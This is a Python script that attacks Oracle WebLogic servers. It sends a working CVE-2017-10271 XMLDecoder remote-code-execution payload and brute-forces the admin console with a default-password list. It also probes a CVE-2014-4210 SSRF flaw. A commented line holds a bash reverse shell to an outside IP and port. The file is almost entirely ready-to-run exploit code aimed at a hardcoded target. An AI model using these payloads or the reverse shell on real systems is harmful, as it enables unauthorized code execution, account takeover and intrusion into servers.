# !/usr/bin/env python           
# coding  : utf-8 
# Date    : 2018-04-03 19:08:00
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: weblogic vuln

import requests


class WebLogic:
    def __init__(self, url):
        if '://' not in url:
            url = 'http://' + url
        self.url = url.strip('/')

    def xmlDecoder(self):
        """Version:10.3.6.0.0/12.1.3.0.0/12.2.1.1.0
        CVE-2017-10271
        """
        headers = {
            "Content-Type":"text/xml;charset=UTF-8",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }

        # <string>bash -i &gt;&amp; /dev/tcp/192.168.1.133/4444 0&gt;&amp;1</string>
        xml = """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java version="1.4.0" class="java.beans.XMLDecoder">
                        <void class="java.lang.ProcessBuilder">
                            <array class="java.lang.String" length="3">
                                <void index="0">
                                    <string>/bin/bash</string>
                                </void>
                                <void index="1">
                                    <string>-c</string>
                                </void>
                                <void index="2">
                                <string>id > /tmp/b4</string>
                                </void>
                            </array>
                        <void method="start"/></void>
                    </java>
                </work:WorkContext>
            </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>"""
        req = requests.post(self.url+":7001/wls-wsat/CoordinatorPortType", headers=headers, data=xml)
        if req.status_code == 500 :
            print('[+] WebLogic xml decoder ')
            # print(req.text)

    def weakPasswd(self):
        """weak password"""

        pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem']
        for user in pwddict:
            for pwd in pwddict:
                data = {
                    'j_username':user,
                    'j_password':pwd,
                    'j_character_encoding':'UTF-8'
                }
                req = requests.post(self.url+':7001/console/j_security_check', data=data, allow_redirects=False, verify=False)

                if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                    print('[+] WebLogic username: '+user+'  password: '+pwd)

    def ssrf(self):
        """Version: 10.0.2/10.3.6
        CVE-2014-4210"""
        # payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
        payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"

        req = requests.get(self.url+payload, timeout=10, verify=False)
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
            print("[+] WebLogic ssrf")



if __name__ == '__main__':
    url = '192.168.136.130'
    wls = WebLogic(url)

    wls.xmlDecoder()
    wls.weakPasswd()
    wls.ssrf()
